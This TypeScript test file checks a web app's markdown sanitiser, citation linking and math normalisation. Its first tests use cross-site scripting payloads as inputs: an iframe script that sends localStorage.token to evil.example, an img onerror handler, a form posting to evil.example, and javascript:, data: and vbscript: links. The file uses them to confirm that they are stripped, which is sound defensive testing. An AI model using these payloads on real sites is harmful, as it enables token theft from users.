// Run with: node --test web/tests/   (Node 24 strips the TypeScript types)
// Renders answers through the same react-markdown configuration as MarkdownRenderer (audit F12).
import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import * as safety from "../src/lib/markdownSafety.ts";
import { normalizeDisplayMath } from "../src/lib/markdownNormalize.ts";
import * as cite from "../src/lib/citations.ts";

const { rehypeStripUnsafe, remarkHtmlBreaks, safeUrl, safeUrlTransform, splitStreamingBlocks } = safety;

function render(markdown: string, rehypeExtra: any[] = []): string {
  return renderToStaticMarkup(
    createElement(
      ReactMarkdown as any,
      {
        skipHtml: true,
        remarkPlugins: [remarkGfm, remarkHtmlBreaks],
        rehypePlugins: [rehypeStripUnsafe, ...rehypeExtra],
        urlTransform: safeUrlTransform,
      },
      markdown
    )
  );
}

test("iframe with script-bearing srcdoc renders no active content", () => {
  const html = render(
    'Before\n\n<iframe srcdoc="<script>fetch(`https://evil.example/?t=${localStorage.token}`)</script>"></iframe>\n\nAfter'
  );
  assert.doesNotMatch(html, /<iframe/i);
  assert.doesNotMatch(html, /srcdoc/i);
  assert.doesNotMatch(html, /<script/i);
  assert.match(html, /Before/);
  assert.match(html, /After/);
});

test("inline img with onerror and other raw tags are dropped", () => {
  const html = render('Look <img src="x" onerror="alert(1)"> here <style>body{display:none}</style> <form action="https://evil.example"><input name="t"></form>');
  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /onerror/i);
  assert.doesNotMatch(html, /<style/i);
  assert.doesNotMatch(html, /<form/i);
  assert.match(html, /Look/);
});

test("javascript:, data: and obfuscated scheme links lose their href", () => {
  // "java%09script:" is not a scheme (% is not allowed in one), so browsers treat it as a relative path.
  for (const href of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x"]) {
    const html = render(`[click](<${href}>)`);
    assert.doesNotMatch(html, /href="(?:java|data|vbscript)/i, href);
  }
  assert.equal(safeUrl("javascript:alert(1)"), "");
  assert.equal(safeUrl("java\tscript:alert(1)"), "");
  assert.equal(safeUrl("https://pubmed.ncbi.nlm.nih.gov/1/"), "https://pubmed.ncbi.nlm.nih.gov/1/");
  assert.equal(safeUrl("#section"), "#section");
  assert.equal(safeUrl("mailto:a@b.org"), "mailto:a@b.org");
});

test("normal links, tables, code blocks and <br> in table cells still render", () => {
  const md = [
    "See [PubMed](https://pubmed.ncbi.nlm.nih.gov/42511798/).",
    "",
    "| Drug | Note |",
    "|---|---|",
    "| sotorasib | line one<br>line two |",
    "",
    "```python",
    "print('<b>not html</b>')",
    "```",
  ].join("\n");
  const html = render(md);
  assert.match(html, /<a href="https:\/\/pubmed\.ncbi\.nlm\.nih\.gov\/42511798\/">PubMed<\/a>/);
  assert.match(html, /<table>/);
  assert.match(html, /line one<br\/>\s*line two/);
  assert.match(html, /<code class="language-python">/);
  // Code is shown as text, not parsed as markup.
  assert.match(html, /&lt;b&gt;not html&lt;\/b&gt;/);
});

test("task-list checkboxes survive; injected data-cite attributes do not", () => {
  const html = render("- [x] done\n- [ ] open");
  assert.match(html, /type="checkbox"/);
  const tree: any = {
    type: "root",
    children: [{ type: "element", tagName: "a", properties: { href: "https://x.org", dataCiteKey: "PMID:1", onClick: "x" }, children: [] }],
  };
  rehypeStripUnsafe()(tree);
  assert.deepEqual(Object.keys(tree.children[0].properties), ["href"]);
});

test("citations are still linked after the unsafe-content strip", () => {
  const map = {
    version: 1,
    entries: {
      "PMID:42511798": {
        key: "PMID:42511798", id: "42511798", type: "pmid", url: "https://pubmed.ncbi.nlm.nih.gov/42511798/",
        source_agent: "Lithoscribe", source_tool: "lithoscribe", passages: [], verified: true,
      },
    },
    aliases: {},
    supports: [],
    unverified: [],
  };
  const html = render("Covalent inhibitors bind a pocket (PMID: 42511798).", [[cite.rehypeCitations, { map }]]);
  assert.match(html, /data-cite-key="PMID:42511798"/);
});

test("streaming blocks split at blank lines but never inside a code fence", () => {
  const blocks = splitStreamingBlocks("# Title\n\nPara one\n\n```\ncode\n\nmore code\n```\n\nTail");
  assert.deepEqual(blocks, ["# Title", "Para one", "```\ncode\n\nmore code\n```", "Tail"]);
});

// Display math as the model writes it: `$$\begin{aligned}` with the fence on the content line, rows ending in `\\`.
const ALIGNED_ANSWER = String.raw`**Step 1 — Brackets:**
$$\begin{aligned}
\frac{5}{6}\times\frac{12}{5} &= \frac{5\times 12}{6\times 5} &&\text{(multiply)}\\
&= \frac{60}{30}\\
&= 2
\end{aligned}$$
Equivalently, by cancellation: $\frac{5}{5}\times\frac{12}{6} = 2$.

**Step 4:**
$$\begin{aligned}
\frac{3}{4} + 2 &= \frac{11}{4}\\[4pt]
\frac{11}{4} - 8 &= -\frac{21}{4}
\end{aligned}$$

**Final exact value:**
$$\boxed{-\frac{21}{4} = -5.25}$$

| Check | Result |
|---|---|
| Exponent | $8$ |`;

function renderMath(markdown: string): string {
  return renderToStaticMarkup(
    createElement(
      ReactMarkdown as any,
      { skipHtml: true, remarkPlugins: [remarkGfm, remarkMath], rehypePlugins: [[rehypeKatex, { throwOnError: false, strict: false }]] },
      markdown
    )
  );
}

test("aligned display math with the fence on the content line renders without KaTeX errors", () => {
  assert.match(renderMath(ALIGNED_ANSWER), /katex-error/); // the raw answer is what broke the page
  const html = renderMath(normalizeDisplayMath(ALIGNED_ANSWER));
  assert.doesNotMatch(html, /katex-error/);
  assert.equal((html.match(/class="katex-display"/g) || []).length, 3);
  assert.match(html, /<p>Equivalently, by cancellation:/); // prose after a block is prose again, not math
  assert.match(html, /<table>/);
});

test("rows inside a math block are never wrapped as standalone formulas", () => {
  const out = normalizeDisplayMath(String.raw`$$\begin{aligned}
\frac{a}{b} &= c\\
\end{aligned}$$`);
  assert.equal(out, String.raw`$$
\begin{aligned}
\frac{a}{b} &= c\\
\end{aligned}
$$`);
});

test("bare formulas and bare aligned environments get delimiters; code, tables and inline math stay as written", () => {
  const formula = String.raw`v = \frac{d}{t}`;
  assert.equal(normalizeDisplayMath(formula), `\n$$\n${formula}\n$$\n`);
  const env = String.raw`\begin{aligned}
x &= \frac{1}{2}\\
\end{aligned}`;
  assert.equal(normalizeDisplayMath(env), `\n$$\n${env}\n$$\n`);
  const code = "```\n" + String.raw`v = \frac{d}{t}` + "\n$$\n```";
  assert.equal(normalizeDisplayMath(code), code);
  assert.equal(normalizeDisplayMath("| a | $$x$$ |"), "| a | $$x$$ |");
  const inline = String.raw`Inline $x = \frac{1}{2}$ stays.`;
  assert.equal(normalizeDisplayMath(inline), inline);
});
